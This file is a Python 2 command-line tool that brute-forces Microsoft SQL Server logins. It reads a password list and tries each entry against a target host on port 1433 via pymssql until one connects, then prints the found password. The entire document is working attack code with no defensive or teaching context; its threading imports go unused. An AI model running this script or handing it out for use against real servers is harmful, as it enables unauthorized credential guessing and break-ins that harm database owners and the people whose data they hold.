import pymssql
import optparse
from threading import *
import multiprocessing


Found = 0

def mssqlconn(hostname,username,passwd):
	global Found
	try:
		pymssql.connect(host=hostname + ':1433', user=username, password=passwd)
		print '[+]MSSQL Password Found:' + passwd
		Found = 1
	except:
		print '[-]Testing:' + passwd
		




def main():  
	parser = optparse.OptionParser('usage%prog '+'-H <target host> -U <user> -F <password list>')  
	parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
	parser.add_option('-U', dest='user', type='string', help='specify the user')
	parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')  
	(options, args) = parser.parse_args()  
	tgtHost = options.tgtHost
	user = options.user
	passwdFile = options.passwdFile
	if (tgtHost == None) | (user == None) | (passwdFile == None):   
		print parser.usage  
		exit(0)
	f = open(passwdFile,'r')
	for line in f.readlines():
		password = line.strip('\n').strip('\r') 
		mssqlconn(tgtHost,user,password)
		if Found:
			exit(0)



	
if __name__ == '__main__':
	main()
